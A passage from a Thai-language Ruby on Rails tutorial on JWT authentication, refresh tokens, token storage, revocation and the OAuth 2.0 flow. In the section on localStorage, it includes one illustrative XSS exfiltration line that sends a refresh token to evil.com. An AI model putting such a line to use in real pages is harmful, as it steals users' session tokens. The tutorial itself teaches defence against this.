      token = JsonWebToken.encode({ user_id: user.id })
      render json: { token: token, exp: 15.minutes.from_now.to_i, user: { id: user.id, email: user.email } },
             status: :ok
    else
      render json: { error: "อีเมลหรือรหัสผ่านไม่ถูกต้อง" }, status: :unauthorized
    end
  end
end
```

> **กับดักที่พบบ่อยเวลาเขียนโค้ดนี้ครั้งแรก (พบจริงตอนทดสอบเขียน Part นี้):** อย่าเขียน
> `JsonWebToken.encode(user_id: user.id)` แบบไม่มีวงเล็บปีกกาครอบ! เพราะ method
> `encode(payload, exp: ...)` มี **keyword argument** (`exp:`) อยู่ในลายเซ็นด้วย Ruby 3 จะ
> ตีความ `user_id: user.id` เป็นความพยายามส่ง keyword argument ชื่อ `user_id` ทันที (ไม่ใช่
> Hash ธรรมดา) แล้วหา positional argument `payload` ไม่เจอเลย ได้ error
> `ArgumentError: wrong number of arguments (given 0, expected 1)` ทันที — นี่คือผลของ
> **การแยก positional Hash กับ keyword arguments อย่างเข้มงวดใน Ruby 3** (ทบทวนแนวคิดนี้จาก
> Part 007 Step 67) วิธีแก้คือใส่วงเล็บปีกกาให้ชัดเจนว่านี่คือ Hash ที่ตั้งใจส่งเป็น
> positional argument: **`JsonWebToken.encode({ user_id: user.id })`**

### `app/controllers/notes_controller.rb` — ตัวอย่าง Protected Endpoint

```ruby
# app/controllers/notes_controller.rb
class NotesController < ApplicationController
  include Authenticatable

  def index
    render json: { message: "สวัสดีคุณ #{current_user.email}, นี่คือรายการโน้ตลับของคุณ" }
  end
end
```

### `app/controllers/application_controller.rb` — `rescue_from JWT::DecodeError`

```ruby
# app/controllers/application_controller.rb
class ApplicationController < ActionController::API
  rescue_from JWT::DecodeError do
    render json: { error: "token ไม่ถูกต้องหรือเสียหาย" }, status: :unauthorized
  end
end
```

**อธิบาย:** ใน `Authenticatable` concern เรา `rescue` error ไว้ในตัว method เองแล้ว (เพื่อให้
ควบคุมข้อความแจ้งเตือนได้ละเอียด) ส่วน `rescue_from` ที่ `ApplicationController` ทำหน้าที่เป็น
**ตาข่ายรองรับชั้นสุดท้าย (last line of defense)** — เผื่อกรณีมี controller อื่นในอนาคตที่เรียก
`JsonWebToken.decode` ตรงๆ โดยไม่ผ่าน concern นี้ (เช่น endpoint พิเศษที่ logic การยืนยันตัวตน
ต่างออกไปเล็กน้อย) แล้วลืม `rescue` เอง ก็ยังไม่มีวันเกิด error 500 ที่ leak stack trace ออกไป
ให้ client เห็น (ทบทวนหลักการ `rescue_from` ระดับ ApplicationController จาก Part 023)

### `config/routes.rb`

```ruby
Rails.application.routes.draw do
  post "login", to: "sessions#create"
  get "notes", to: "notes#index"
end
```

### ทดสอบ End-to-End ด้วย `curl` จริง

สร้าง user ทดสอบก่อน:

```bash
bin/rails runner 'User.find_or_create_by!(email: "test@example.com") { |u| u.password = "password123" }'
bin/rails server -p 3099
```

**1) Login สำเร็จ:**

```bash
curl -s -X POST http://127.0.0.1:3099/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}'
```

```json
{"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3OTA0MDQ3ODl9.48SSFic4vAUrhOMu83gij7sJjSMhNoM5MX9Nd164SWI","exp":1790404789,"user":{"id":1,"email":"test@example.com"}}
```

**2) Login รหัสผ่านผิด:**

```bash
curl -s -X POST http://127.0.0.1:3099/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"wrong"}'
# => {"error":"อีเมลหรือรหัสผ่านไม่ถูกต้อง"}
```

**3) เรียก protected endpoint ด้วย token ที่ได้:**

```bash
TOKEN="eyJhbGciOiJIUzI1NiJ9...."   # token จริงจาก response ข้อ 1

curl -s http://127.0.0.1:3099/notes -H "Authorization: Bearer $TOKEN"
# => {"message":"สวัสดีคุณ test@example.com, นี่คือรายการโน้ตลับของคุณ"}
```

**4) เรียก protected endpoint โดยไม่แนบ token:**

```bash
curl -s -w "\nHTTP_STATUS:%{http_code}\n" http://127.0.0.1:3099/notes
```

```
{"error":"ไม่พบ token กรุณา login ก่อนใช้งาน"}
HTTP_STATUS:401
```

**5) เรียก protected endpoint ด้วย token ปลอม/เสีย:**

```bash
curl -s -w "\nHTTP_STATUS:%{http_code}\n" http://127.0.0.1:3099/notes \
  -H "Authorization: Bearer garbage.token.here"
```

```
{"error":"token ไม่ถูกต้อง"}
HTTP_STATUS:401
```

ทั้ง 5 กรณีข้างต้นทดสอบรันจริงแล้วบน Ruby 3.3.6 / Rails 8.1.4 ให้ผลลัพธ์ตรงตามที่คาดหวังทุก
ประการ — นี่คือ **API authentication flow ที่สมบูรณ์ที่สุดในเวอร์ชันขั้นต่ำ**: login ได้ token,
ใช้ token เข้าถึงข้อมูลที่ปกป้องไว้, และถูกปฏิเสธอย่างถูกต้องเมื่อไม่มี/token ผิด

---

## Step 445: Token Expiration (`exp`) และ Refresh Token Pattern

### ทำไม Access Token ต้องมีอายุสั้น

Token ที่ไม่มีวันหมดอายุคือความเสี่ยงมหาศาล — ถ้า token รั่วไหลไปแม้เพียงครั้งเดียว (หลุดใน
log, ถูกดักจับระหว่างทาง, อุปกรณ์ผู้ใช้ถูกขโมย) ผู้ไม่หวังดีจะใช้สิทธิ์นั้น **ตลอดไป** โดยไม่มี
ทางหยุดได้เลย (ปัญหาเรื่อง revoke จะเจาะลึกใน Step 447) ทางแก้มาตรฐานคือกำหนด **`exp` claim
ให้สั้น** (นิยมใช้ 5–15 นาที) เพื่อจำกัด "หน้าต่างความเสี่ยง" ให้แคบที่สุด

แต่ปัญหาตามมาทันที: จะให้ผู้ใช้ **login ใหม่ทุก 15 นาที** ตลอดการใช้งานจริงหรือ? นั่นคือ UX
ที่แย่มาก — ทางออกคือ **Refresh Token Pattern**

### แนวคิด: Access Token สั้น + Refresh Token ยาว

| | Access Token | Refresh Token |
|---|---|---|
| อายุ | สั้น (5–15 นาที) | ยาว (7–30 วัน) |
| ใช้ทำอะไร | แนบไปกับทุก API request เพื่อยืนยันตัวตน | แลกเป็น access token ใหม่เมื่อ
  token เก่าหมดอายุ |
| รูปแบบ | JWT (ตรวจสอบได้เองไม่ต้อง query DB) | แนะนำให้เป็น **opaque token** (สุ่มมาเฉยๆ
  ไม่มีความหมายในตัวเอง) เก็บสถานะไว้ในฐานข้อมูล |
| Revoke ได้ทันทีไหม | ไม่ได้ (จนกว่าจะหมดอายุ) | **ได้ทันที** (แค่ลบ/mark revoke record ใน DB) |

**ทำไม refresh token ควรเป็น opaque token ที่เก็บใน DB แทนที่จะเป็น JWT อีกตัว?** เพราะข้อดี
หลักของ JWT (ตรวจสอบได้เองไม่ต้อง query DB) กลับกลายเป็นข้อเสียสำหรับ refresh token — เรา
**ต้องการ revoke refresh token ได้ทันที** (เช่นตอน logout หรือสงสัยว่าอุปกรณ์ถูกขโมย) ซึ่งทำ
ได้ง่ายมากถ้ามันเป็น record ในฐานข้อมูลที่ query ทุกครั้งอยู่แล้ว (การ query ฐานข้อมูล 1 ครั้ง
ตอน refresh ซึ่งเกิดไม่บ่อย ไม่ใช่ปัญหาประสิทธิภาพเหมือนถ้าต้อง query ทุก request ปกติ)

### `RefreshToken` Model — เก็บเฉพาะ Digest ไม่เก็บ Token ตัวจริง

```bash
bin/rails g model RefreshToken user:references token_digest:string:uniq expires_at:datetime revoked_at:datetime
bin/rails db:migrate
```

```ruby
# app/models/refresh_token.rb
class RefreshToken < ApplicationRecord
  belongs_to :user

  # เก็บเฉพาะ SHA-256 digest ของ token ลงฐานข้อมูล ไม่เก็บ token ตัวจริง (เทียบเท่าหลักการ
  # เดียวกับ has_secure_password ที่ไม่เก็บรหัสผ่านตรงๆ) — ถ้าฐานข้อมูลรั่ว ผู้โจมตีก็เอา
  # digest ไปใช้ปลอมเป็น refresh token จริงไม่ได้
  def self.digest(raw_token)
    Digest::SHA256.hexdigest(raw_token)
  end

  def self.issue_for(user, ttl: 30.days)
    raw_token = SecureRandom.hex(32)
    create!(user: user, token_digest: digest(raw_token), expires_at: ttl.from_now)
    raw_token
  end

  def self.find_active(raw_token)
    record = find_by(token_digest: digest(raw_token))
    record if record&.active?
  end

  def active?
    revoked_at.nil? && expires_at.future?
  end

  def revoke!
    update!(revoked_at: Time.current)
  end
end
```

**อธิบาย:**

- `Digest::SHA256.hexdigest` ต่างจาก `bcrypt` ที่ใช้กับรหัสผ่าน (Part 041) ตรงที่ **ไม่ใส่
  salt และคำนวณเร็วโดยตั้งใจ** — เหมาะกับ refresh token เพราะมันเป็น **ค่าสุ่ม 32 byte ที่
  เดาไม่ได้อยู่แล้ว** (ต่างจากรหัสผ่านที่มนุษย์ตั้งเอง มักซ้ำ/เดาได้ จึงต้องใช้ bcrypt ที่ตั้งใจ
  ทำให้คำนวณช้าเพื่อป้องกัน brute-force) การใช้ SHA-256 ธรรมดาก็เพียงพอและเร็วกว่ามากสำหรับ
  กรณีนี้
- `SecureRandom.hex(32)` สร้าง string สุ่มที่เดาไม่ได้ 64 ตัวอักษร (32 byte แปลงเป็น hex)
  ทบทวน `SecureRandom` จาก Part 002 — ใช้แทน `rand` ธรรมดาเสมอเมื่อเกี่ยวกับความปลอดภัย
- `find_active` คืน `nil` ทั้งกรณี "หา token ไม่เจอเลย" และ "เจอแต่หมดอายุ/ถูกเพิกถอนแล้ว" —
  การไม่แยกสองกรณีนี้ **ตั้งใจ** เพื่อไม่เปิดเผยข้อมูลให้ผู้โจมตีรู้ว่า token ที่ส่งมา "เคยมี
  อยู่จริงแต่หมดอายุแล้ว" ต่างจาก "ไม่เคยมีอยู่เลย" (ข้อมูลรั่วไหลเล็กน้อยแบบนี้เรียกว่า
  **information leakage** ซึ่งเป็นหัวข้อที่จะเจาะลึกใน Part 079–081)

### ปรับ `SessionsController` ให้ออก Refresh Token คู่กับ Access Token

```ruby
# app/controllers/sessions_controller.rb
class SessionsController < ApplicationController
  def create
    user = User.find_by(email: params[:email])

    if user&.authenticate(params[:password])
      access_token = JsonWebToken.encode({ user_id: user.id })
      refresh_token = RefreshToken.issue_for(user)

      render json: {
        access_token: access_token,
        refresh_token: refresh_token,
        exp: 15.minutes.from_now.to_i,
        user: { id: user.id, email: user.email }
      }, status: :ok
    else
      render json: { error: "อีเมลหรือรหัสผ่านไม่ถูกต้อง" }, status: :unauthorized
    end
  end
end
```

### `RefreshTokensController` — `POST /refresh` และ `DELETE /logout`

```ruby
# app/controllers/refresh_tokens_controller.rb
class RefreshTokensController < ApplicationController
  # ไม่ include Authenticatable เพราะ endpoint นี้ไม่ต้องใช้ access token (ซึ่งอาจหมดอายุแล้ว)
  # แต่ต้องใช้ refresh_token แทน

  def create
    record = RefreshToken.find_active(params[:refresh_token])

    if record
      new_access_token = JsonWebToken.encode({ user_id: record.user_id })
      render json: { access_token: new_access_token, exp: 15.minutes.from_now.to_i }
    else
      render json: { error: "refresh token ไม่ถูกต้อง หมดอายุ หรือถูกเพิกถอนแล้ว" }, status: :unauthorized
    end
  end

  # ใช้ตอน logout — เพิกถอน refresh token ทันที ทำให้ออก access token ใหม่ไม่ได้อีก
  def destroy
    record = RefreshToken.find_active(params[:refresh_token])
    record&.revoke!

    head :no_content
  end
end
```

```ruby
# config/routes.rb (เพิ่มจากเดิม)
post "refresh", to: "refresh_tokens#create"
delete "logout", to: "refresh_tokens#destroy"
```

### ทดสอบ Flow เต็มรูปแบบด้วย `curl` จริง

```bash
BASE=http://127.0.0.1:3099

# 1) Login ได้ access_token + refresh_token
LOGIN=$(curl -s -X POST "$BASE/login" -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}')
echo "$LOGIN"
```

```json
{"access_token":"eyJhbGci...zHlLdfG...","refresh_token":"8f4bb6ea8211be98563b09acd3753d78...","exp":1790405055,"user":{"id":1,"email":"test@example.com"}}
```

```bash
# 2) ใช้ refresh_token แลก access_token ใหม่
curl -s -X POST "$BASE/refresh" -H "Content-Type: application/json" \
  -d '{"refresh_token":"8f4bb6ea8211be98..."}'
```

```json
{"access_token":"eyJhbGci...KXf_e8R...","exp":1790405098}
```

**สังเกตว่า access token ตัวใหม่ต่างจากตัวเดิม** (เพราะมี claim `iat` ที่เปลี่ยนไปทุกครั้ง
ตามที่อธิบายไว้ใน Step 444) ทดสอบรันจริงยืนยันว่า `access_token` ทั้งสองตัวไม่ซ้ำกัน และ
access token ตัวใหม่ใช้เรียก `/notes` ได้สำเร็จตามปกติ

```bash
# 3) Logout — เพิกถอน refresh token
curl -s -o /dev/null -w "%{http_code}\n" -X DELETE "$BASE/logout" \
  -H "Content-Type: application/json" -d '{"refresh_token":"8f4bb6ea8211be98..."}'
# => 204

# 4) พยายามใช้ refresh_token เดิมอีกครั้งหลัง logout (ต้องถูกปฏิเสธ)
curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X POST "$BASE/refresh" \
  -H "Content-Type: application/json" -d '{"refresh_token":"8f4bb6ea8211be98..."}'
```

```
{"error":"refresh token ไม่ถูกต้อง หมดอายุ หรือถูกเพิกถอนแล้ว"}
HTTP_STATUS:401
```

ทดสอบรันจริงครบทั้ง 4 ขั้นตอนยืนยันว่า flow ทำงานถูกต้องสมบูรณ์: login ออก token คู่, refresh
ได้ access token ใหม่ที่ไม่ซ้ำของเดิม, และ logout เพิกถอน refresh token ได้จริงจนใช้ซ้ำไม่ได้
อีกต่อไป

---

## Step 446: เก็บ Refresh Token ไว้ที่ไหนดี — httpOnly Cookie vs `localStorage` และปัญหา XSS

คำถามที่ตามมาทันทีคือ: **ฝั่ง client (JavaScript ใน browser) ควรเก็บ refresh token ไว้ที่ไหน?**
นี่คือหนึ่งในหัวข้อที่ถกเถียงกันมากที่สุดในวงการ frontend/security — ไม่มีคำตอบเดียวที่ถูกต้อง
เสมอไป แต่มี **ข้อเท็จจริงทางเทคนิค** ที่ต้องเข้าใจก่อนตัดสินใจ

### ตัวเลือกที่ 1: `localStorage` (หรือ `sessionStorage`)

```javascript
// ฝั่ง frontend (ตัวอย่างเชิงแนวคิด ไม่ใช่ Ruby)
localStorage.setItem("refresh_token", data.refresh_token);
// ตอนจะใช้:
const token = localStorage.getItem("refresh_token");
```

**ข้อดี:**
- เขียนโค้ดง่าย เข้าถึงได้ตรงไปตรงมาจาก JavaScript
- ไม่มีปัญหาเรื่อง CORS/cookie อย่างที่อธิบายใน Step 441 (ส่งผ่าน header เอง ไม่ผ่าน
  cookie jar เลย)

**ข้อเสียร้ายแรง:** **`localStorage` เข้าถึงได้จาก JavaScript ใดๆ ก็ตามที่รันอยู่บนหน้านั้น**
รวมถึงสคริปต์ที่ผู้โจมตีแอบฝังเข้ามาผ่านช่องโหว่ **XSS (Cross-Site Scripting)** — ถ้าเว็บมี
ช่องโหว่ XSS แม้เพียงจุดเดียว (เช่น แสดงข้อมูลจากผู้ใช้โดยไม่ escape ให้ถูกต้อง) ผู้โจมตีสามารถ
ฝังโค้ด `fetch("https://evil.com?token=" + localStorage.getItem("refresh_token"))` แล้วขโมย
refresh token ไปใช้ได้ทันที **โดยไม่ต้องผ่านการป้องกันใดๆ เลย** เพราะ `localStorage` ไม่มี
กลไกป้องกันการเข้าถึงจากสคริปต์ในหน้าเดียวกันในตัวมันเอง

### ตัวเลือกที่ 2: httpOnly Cookie

```ruby
# ฝั่ง Rails (ตอบกลับตอน login แทนการส่ง refresh_token ใน JSON body)
cookies[:refresh_token] = {
  value: refresh_token,
  httponly: true,   # JavaScript อ่านค่านี้ไม่ได้เลย (document.cookie จะไม่เห็น)
  secure: true,     # ส่งผ่าน HTTPS เท่านั้น
  same_site: :strict, # ไม่ส่งไปกับ cross-site request เลย ป้องกัน CSRF ไปในตัว
  expires: 30.days.from_now
}
```

**ข้อดี:** cookie ที่ตั้ง `httponly: true` **อ่านค่าจาก JavaScript ไม่ได้เลยแม้แต่บรรทัดเดียว**
(`document.cookie` จะไม่แสดง cookie นี้ให้เห็น) แปลว่าแม้เว็บจะมีช่องโหว่ XSS สคริปต์ที่ฝังเข้ามา
ก็ **ขโมย refresh token ไปด้วยวิธีนี้ไม่ได้เลย** — ป้องกัน XSS สำหรับ token ตัวนี้ได้อย่างสมบูรณ์

**ข้อเสีย:** กลับมาเจอปัญหาเดียวกับ Step 441 (cookie jar ใช้กับ mobile app ตรงๆ ไม่ได้, ต้อง
จัดการ CORS/`SameSite` ให้ถูกต้องถ้า frontend คนละโดเมน) และเปิดความเสี่ยงต่อ **CSRF** กลับมา
อีกครั้ง (แม้ `SameSite=Strict` จะช่วยลดความเสี่ยงนี้ไปมากแล้วก็ตาม)

### ตารางสรุปการตัดสินใจ

| ปัจจัย | `localStorage` | httpOnly Cookie |
|---|---|---|
| ป้องกัน XSS ขโมย token | **ไม่ได้เลย** | ป้องกันได้สมบูรณ์ |
| ป้องกัน CSRF | ไม่เกี่ยวข้อง (ไม่ได้ส่งอัตโนมัติ) | ต้องตั้ง `SameSite` ให้ถูกต้อง |
| ใช้กับ Mobile App ตรงๆ | ใช้ได้ง่าย (mobile ไม่มี `localStorage` แต่ใช้ secure storage
  เทียบเท่าได้) | ยุ่งยากกว่า (ต้องจัดการ cookie jar เอง) |
| ใช้กับ SPA คนละโดเมน | ง่าย (ส่งผ่าน header ธรรมดา) | ต้องตั้งค่า CORS + `SameSite=None`
  ให้ถูกต้อง |
| คำแนะนำที่ใช้จริงในวงการ (ปี 2026) | **หลีกเลี่ยงสำหรับ refresh token** | **แนะนำเป็นค่า
  เริ่มต้น** เมื่อ frontend/backend ควบคุมได้ทั้งคู่ |

### แนวทางที่แนะนำในทางปฏิบัติ (Best Practice ปัจจุบัน)

1. **Access token** — เก็บไว้ใน **memory เท่านั้น** (เช่น JavaScript variable ใน state ของ
   React/Vue ไม่เขียนลง `localStorage`/cookie เลย) เพราะอายุสั้นมาก (5–15 นาที) ถ้าหลุดไป
   ความเสียหายจำกัดตามเวลาที่เหลือ และ memory หายไปเองเมื่อ refresh หน้าเว็บ (ต้องขอ access
   token ใหม่ผ่าน refresh token ตอนโหลดหน้าใหม่ทุกครั้ง)
2. **Refresh token** — เก็บใน **httpOnly cookie** เสมอเมื่อทำได้ (คือกรณี frontend/backend
   เป็นเว็บที่ควบคุมได้ทั้งคู่) เพราะมันมีอายุยาว ความเสียหายจากการหลุดจึงร้ายแรงกว่ามาก การ
   ป้องกัน XSS จึงสำคัญกว่าความสะดวกในการเขียนโค้ด
3. สำหรับ **mobile app** ที่ไม่มี browser/cookie jar เกี่ยวข้องเลย ให้เก็บ refresh token ไว้ใน
   **secure storage เฉพาะของแพลตฟอร์ม** (iOS Keychain, Android Keystore) ซึ่งมีการเข้ารหัส
   ระดับ OS ป้องกันไว้อยู่แล้ว ไม่ใช่ปัญหาเดียวกับ `localStorage` ของเว็บ

> **ไม่มีคำตอบที่สมบูรณ์แบบ 100%:** แม้แต่ httpOnly cookie ก็ยังมีความเสี่ยงหลงเหลือ (CSRF,
> การขโมย cookie ผ่านการโจมตีระดับ network ถ้าไม่บังคับ HTTPS) การออกแบบระบบความปลอดภัยที่ดี
> คือการ **ลดพื้นที่เสี่ยง (attack surface) ให้เล็กที่สุดเท่าที่จำเป็น** ไม่ใช่การหาวิธีที่
> "ปลอดภัย 100%" ซึ่งไม่มีอยู่จริง — เรื่องนี้จะกลับมาเป็นแก่นของ Part 079–081 ทั้ง Phase

---

## Step 447: การ Revoke JWT — ปัญหาคลาสสิกที่แก้ไม่ได้ตรงๆ และวิธีบรรเทาที่ใช้จริง

### ทำไม "Revoke JWT ทันที" ถึงเป็นปัญหาที่แก้ไม่ได้ตรงๆ

จุดแข็งที่สุดของ JWT คือ **server ตรวจสอบ token ได้เองโดยไม่ต้อง query ฐานข้อมูล** (แค่ตรวจสอบ
signature ผ่าน server ก็เชื่อได้ทันที) — แต่จุดแข็งข้อนี้กลับกลายเป็น **จุดอ่อนที่สุด** พอต้อง
การ "เพิกถอน (revoke)" token ที่ออกไปแล้วก่อนเวลาหมดอายุ (`exp`) จริง

ลองนึกภาพสถานการณ์จริง: ผู้ใช้ทำโทรศัพท์หาย ต้องการ "logout จากทุกอุปกรณ์ทันที" หรือ admin
ตรวจพบว่า account หนึ่งถูกแฮ็ก ต้องการ **ยกเลิกสิทธิ์ token ที่ออกไปแล้วทันที** — ด้วยกลไก JWT
แบบพื้นฐานที่เรียนมา **ทำไม่ได้เลย** เพราะ server ไม่มี "บัญชีรายชื่อ token ที่ยังใช้งานได้"
ที่ไหนให้ไปลบออก มันแค่ตรวจสอบ signature กับเวลาหมดอายุเท่านั้น ตราบใดที่ signature ถูกต้องและ
ยังไม่ถึงเวลา `exp` — token นั้น **ยังคงใช้งานได้เสมอ** ไม่ว่า server จะ "อยากจะ" ปฏิเสธมันแค่
ไหนก็ตาม

### วิธีบรรเทาที่ 1 (แนะนำที่สุด): Short Expiry + Refresh Token

นี่คือเหตุผลที่แท้จริงเบื้องหลัง pattern ที่เพิ่งเรียนใน Step 445–446 — มันไม่ได้มีไว้เพื่อ
ความสะดวกของผู้ใช้อย่างเดียว แต่เป็น **กลยุทธ์หลักในการจัดการปัญหา revoke**:

- **Access token (JWT)** อายุสั้นมาก (5–15 นาที) — แม้ revoke ทันทีไม่ได้ แต่ "หน้าต่างความ
  เสี่ยง" ถูกจำกัดไว้แค่ไม่กี่นาทีเท่านั้น หลังจากนั้นมันจะหมดอายุเองโดยอัตโนมัติไม่ว่าจะทำ
  อะไรก็ตาม
- **Refresh token (opaque, เก็บใน DB)** คือจุดที่ **revoke ได้ทันทีจริงๆ** (อย่างที่ทดสอบใน
  Step 445 ตอน logout) — เมื่อ refresh token ถูกเพิกถอน ผู้ใช้คนนั้นจะไม่สามารถขอ access
  token ใหม่ได้อีกเลย และ access token ตัวสุดท้ายที่ถืออยู่ก็จะหมดอายุภายใน 15 นาทีถัดไป

ผลลัพธ์คือ **"เพิกถอนแบบ effectively ทันที"** ในทางปฏิบัติ (ล่าช้าแค่ไม่กี่นาทีสูงสุด) โดยไม่
ต้องแลกกับข้อดีเรื่อง stateless ของ access token เลย เพราะ database query เกิดขึ้นแค่ตอน
`/login` และ `/refresh` (ซึ่งเกิดไม่บ่อย) ไม่ใช่ทุก request ปกติที่เรียก API

### วิธีบรรเทาที่ 2: Server-side Denylist (Blocklist)

ถ้าจำเป็นต้อง revoke **access token เองโดยตรง** ทันที (ไม่รอให้หมดอายุแม้แต่วินาทีเดียว) —
เช่น ระบบที่มีความอ่อนไหวสูงมาก (ธนาคาร, ระบบการเงิน) — ทางเลือกคือเก็บ **denylist (บัญชีดำ)**
ของ token ที่ถูกเพิกถอนไว้ใน cache ที่เร็วมาก (นิยมใช้ **Redis**) แล้วตรวจสอบทุกครั้งก่อน
ยอมรับ token:

```ruby
# ตัวอย่างแนวคิด (ต้องมี Redis หรือ cache store ที่รวดเร็วรองรับ ยังไม่ได้เรียนเต็มรูปแบบใน
# หลักสูตรนี้จนถึง Part 063 เรื่อง Rails.cache)
module Authenticatable
  private

  def authenticate_request!
    # ... โค้ดเดิมจาก Step 444 ...
    payload = JsonWebToken.decode(token)

    if TokenDenylist.revoked?(payload[:jti]) # jti = "JWT ID" claim เฉพาะสำหรับ track token นี้
      render json: { error: "token นี้ถูกเพิกถอนแล้ว" }, status: :unauthorized and return
    end

    @current_user = User.find(payload[:user_id])
  end
end
```

**ข้อเสียของวิธีนี้:** มันทำลายจุดแข็งที่สุดของ JWT ทิ้งไปเลย — ทุก request ต้อง query
denylist ก่อนเสมอ (แม้จะเร็วมากด้วย Redis ก็ยังเป็น network call เพิ่มขึ้นทุกครั้ง) ทำให้ระบบ
**ไม่ stateless อีกต่อไป** ในทางปฏิบัติ ถ้าต้องทำถึงขนาดนี้ หลายทีมเลือกกลับไปใช้
session-based auth ที่เก็บ state ฝั่ง server ตั้งแต่แรกแทน เพราะได้ผลลัพธ์เดียวกัน (revoke
ทันที) แต่ไม่ต้องแบกภาระของทั้งสองระบบพร้อมกัน — จึงเป็นเหตุผลว่าทำไมวิธีนี้ **ไม่ใช่ default
ที่แนะนำ** ให้ใช้เฉพาะกรณีจำเป็นจริงๆ เท่านั้น

### สรุปการตัดสินใจเรื่อง Revocation

> **หลักการจำง่าย:** "JWT ไม่ได้ออกแบบมาให้ revoke ได้ง่าย นี่ไม่ใช่บัค แต่เป็น trade-off ที่
> ตั้งใจแลกมาเพื่อความเร็วและ stateless" ถ้าระบบต้องการ revoke ทันทีเป๊ะๆ เสมอ ให้ตั้งคำถาม
> ก่อนว่า **จำเป็นต้องใช้ JWT จริงหรือไม่** — Short expiry + refresh token pattern คือคำตอบที่
> เหมาะสมสำหรับ **ระบบส่วนใหญ่** Denylist คือคำตอบสำหรับ **กรณีพิเศษที่ยอมแลกความเร็ว** และ
> ถ้าต้อง revoke ทันทีเป๊ะๆ ทุกกรณีจริงๆ **session-based auth (Part 041–042) อาจเหมาะสมกว่า
> ตั้งแต่แรก**

---

## Step 448: OAuth 2.0 คืออะไรจริงๆ — Sequence เต็มรูปแบบก่อนแตะ Omniauth

ก่อนเขียนโค้ด "Sign in with Google" สักบรรทัดเดียว ต้องเข้าใจก่อนว่า **OAuth 2.0 ไม่ใช่
protocol สำหรับ authentication (ยืนยันตัวตน) โดยตรง** — มันคือ protocol สำหรับ
**authorization (การให้สิทธิ์)**: ให้แอปหนึ่ง (เช่น Rails app ของเรา) เข้าถึงข้อมูลบางอย่างของ
ผู้ใช้ที่อยู่ใน**อีกระบบหนึ่ง** (เช่น Google) **โดยไม่ต้องรู้รหัสผ่าน Google ของผู้ใช้เลย**

ฟีเจอร์ "Sign in with Google" ที่เราคุ้นเคยคือการ**เอา OAuth มาใช้แบบอ้อม**: เราขอสิทธิ์อ่าน
"อีเมลกับชื่อ" ของผู้ใช้จาก Google แล้วใช้ข้อมูลนั้นมา identify ตัวตนผู้ใช้ในระบบของเราเอง
(ส่วนนี้จริงๆ มีมาตรฐานเฉพาะทางชื่อ **OpenID Connect** ที่สร้างต่อยอดจาก OAuth 2.0 อีกที แต่
สำหรับระดับที่ใช้งานทั่วไป เข้าใจ OAuth 2.0 พื้นฐานก็เพียงพอแล้ว)

### ตัวละครในระบบ OAuth 2.0 (OAuth Roles)

| บทบาท | คือใคร ในตัวอย่าง "Sign in with Google" |
|---|---|
| **Resource Owner** | ผู้ใช้ (เจ้าของบัญชี Google) |
| **Client** | แอปพลิเคชันของเรา (Rails app) ที่ต้องการเข้าถึงข้อมูล |
| **Authorization Server** | Google (ระบบที่ยืนยันตัวตนผู้ใช้และออก authorization code/token) |
| **Resource Server** | Google API (ที่เก็บข้อมูล email/profile จริง) — ในกรณีนี้มักเป็น
  server เดียวกับ Authorization Server |

### Sequence เต็มรูปแบบของ Authorization Code Flow (แบบที่ Omniauth ใช้)

```
ผู้ใช้ (Browser)          Rails App (Client)          Google (Authorization Server)
      │                          │                              │
      │  1. คลิก "Login with     │                              │
      │     Google"              │                              │
      ├─────────────────────────>│                              │
      │                          │  2. Redirect ผู้ใช้ไปยัง      │
      │                          │     Google พร้อม client_id,   │
      │                          │     redirect_uri, scope       │
      │<─────────────────────────┤                              │
      │                                                          │
      │  3. Browser ถูก redirect ไปหน้า Google โดยตรง            │
      ├─────────────────────────────────────────────────────────>│
      │                                                          │
      │  4. ผู้ใช้ login เข้า Google (ถ้ายังไม่ login) แล้วเห็น   │
      │     หน้า "ยินยอมให้ [Rails App] เข้าถึงอีเมล/โปรไฟล์      │
      │     ของคุณหรือไม่" แล้วกด "อนุญาต"                        │
      │<─────────────────────────────────────────────────────────┤
      │                                                          │
      │  5. Google redirect กลับมาที่ redirect_uri ของเรา         │
      │     พร้อม "authorization code" แนบใน query string        │
      │     เช่น https://ourapp.com/auth/google/callback?code=XYZ│
      ├─────────────────────────>│                              │
      │                          │                              │
      │                          │  6. Rails App ส่ง code นี้     │
      │                          │     กลับไปแลกเป็น access token │
      │                          │     (เรียก Google โดยตรง       │
      │                          │     server-to-server ไม่ผ่าน   │
      │                          │     browser ผู้ใช้แล้ว)         │
      │                          ├─────────────────────────────>│
      │                          │                              │
      │                          │  7. Google ตรวจสอบ code +      │
      │                          │     client_secret ถูกต้อง      │
      │                          │     แล้วตอบกลับ access token   │
      │                          │     ของ Google (คนละตัวกับ     │
      │                          │     JWT ของเราเอง)             │
      │                          │<─────────────────────────────┤
      │                          │                              │
      │                          │  8. Rails App ใช้ access token │
      │                          │     ของ Google เรียก Google    │
      │                          │     People API ขอข้อมูล        │
      │                          │     email/name ของผู้ใช้        │
      │                          ├─────────────────────────────>│
      │                          │<─────────────────────────────┤
      │                          │                              │
      │  9. Rails App find_or_   │                              │
      │     create User ใน DB   │                              │
      │     ของตัวเอง แล้วออก    │                              │
      │     JWT ของตัวเอง (คนละ  │                              │
      │     ตัวกับ token Google) │                              │
      │<─────────────────────────┤                              │
```

**จุดที่ต้องเข้าใจให้ชัดเจนที่สุด:**

1. **Client secret (`client_secret`) ไม่เคยถูกส่งผ่าน browser เลย** — การแลก code เป็น
   access token (ขั้นตอนที่ 6) เกิดขึ้น **server-to-server โดยตรง** ระหว่าง Rails app กับ
   Google เท่านั้น ผู้ใช้ไม่มีทางเห็นหรือดักจับ `client_secret` ได้จาก network traffic ของ
   ตัวเองเลย — นี่คือเหตุผลที่ flow นี้ปลอดภัยกว่าการให้ client (JavaScript ฝั่ง browser)
   จัดการแลก token เอง (ซึ่งจะต้องฝัง `client_secret` ไว้ใน JavaScript ที่ใครก็ดูได้)
2. **Rails app ไม่เคยเห็นรหัสผ่าน Google ของผู้ใช้เลยแม้แต่ตัวอักษรเดียว** — ผู้ใช้พิมพ์รหัส
   ผ่านบนหน้าของ Google โดยตรง (ขั้นตอนที่ 4) นี่คือเหตุผลหลักที่ OAuth ถูกคิดค้นขึ้นมาตั้งแต่
